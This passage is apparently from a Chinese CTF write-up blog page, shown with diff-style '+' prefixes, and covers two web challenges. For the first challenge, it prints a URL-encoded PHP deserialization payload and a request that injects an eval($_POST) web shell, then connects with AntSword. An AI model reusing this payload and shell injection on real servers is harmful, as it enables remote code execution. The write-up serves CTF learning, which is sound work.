+<h3 id="八苦"><a href="#八苦" class="headerlink" title="八苦"></a>八苦</h3><p>扫目录，查看源码index.phps</p>
+<img src="/2019/08/29/fifth-space-wp/13.png">
+<p>反序列化，step1 提示，查看 phpinfo()，直接构造序列化串</p>
+<img src="/2019/08/29/fifth-space-wp/14.png">
+<img src="/2019/08/29/fifth-space-wp/15.png">
+<p>找到 preload 文件</p>
+<img src="/2019/08/29/fifth-space-wp/16.png">
+<p>构造 反序列化串</p>
+<img src="/2019/08/29/fifth-space-wp/17.png">
+<p>O%3A13%3A”Welcome_again”%3A2%3A%7Bs%3A7%3A”willing”%3Bi%3A1%3Bs%3A6%3A”action”%3BO%3A4%3A”Test”%3A2%3A%7Bs%3A10%3A”%00%2A%00careful”%3BN%3Bs%3A8%3A”securuty”%3Ba%3A1%3A%7Bs%3A9%3A”say_hello”%3Bi%3A1%3B%7D%7D%7D</p>
+<p><a href="http://111.33.164.6:10004/?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3BN%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D&amp;dangerous=&quot;/var/www/html/flag.php&quot;;eval($_POST[&#39;a" target="_blank" rel="noopener">http://111.33.164.6:10004/?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3BN%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D&amp;dangerous=&quot;/var/www/html/flag.php&quot;;eval($_POST[&#39;a</a>‘])</p>
+<p>蚁剑连接</p>
+<img src="/2019/08/29/fifth-space-wp/18.png">
+<p>得到flag</p>
+<h3 id="六尘"><a href="#六尘" class="headerlink" title="六尘"></a>六尘</h3><p>扫描目录扫到/log目录，访问 access.log</p>
+<img src="/2019/08/29/fifth-space-wp/19.png">
+<p>查找 flag，得到 flag 提交地址</p>
+<img src="/2019/08/29/fifth-space-wp/20.png">
+<p>得到 flag</p>
+<img src="/2019/08/29/fifth-space-wp/21.png">
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/19/zgc_wp/" rel="next" title="Writeup | 网络与信息安全专项赛">
+                <i class="fa fa-chevron-left"></i> Writeup | 网络与信息安全专项赛
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Waterdrop</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WaterDrop-WriteUp"><span class="nav-number">1.</span> <span class="nav-text">WaterDrop WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.1.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#立雪"><span class="nav-number">1.1.1.</span> <span class="nav-text">立雪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#西来"><span class="nav-number">1.1.2.</span> <span class="nav-text">西来</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拈花"><span class="nav-number">1.1.3.</span> <span class="nav-text">拈花</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#朝彻"><span class="nav-number">1.1.4.</span> <span class="nav-text">朝彻</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#坐忘"><span class="nav-number">1.1.5.</span> <span class="nav-text">坐忘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#玄冥"><span class="nav-number">1.1.6.</span> <span class="nav-text">玄冥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#於讴"><span class="nav-number">1.1.7.</span> <span class="nav-text">於讴</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#聂许"><span class="nav-number">1.1.8.</span> <span class="nav-text">聂许</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#副墨"><span class="nav-number">1.1.9.</span> <span class="nav-text">副墨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#洛诵"><span class="nav-number">1.1.10.</span> <span class="nav-text">洛诵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#正定"><span class="nav-number">1.1.11.</span> <span class="nav-text">正定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一苇"><span class="nav-number">1.1.12.</span> <span class="nav-text">一苇</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空相"><span class="nav-number">1.2.1.</span> <span class="nav-text">空相</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#空性"><span class="nav-number">1.2.2.</span> <span class="nav-text">空性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#八苦"><span class="nav-number">1.2.3.</span> <span class="nav-text">八苦</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#六尘"><span class="nav-number">1.2.4.</span> <span class="nav-text">六尘</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Waterdrop</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
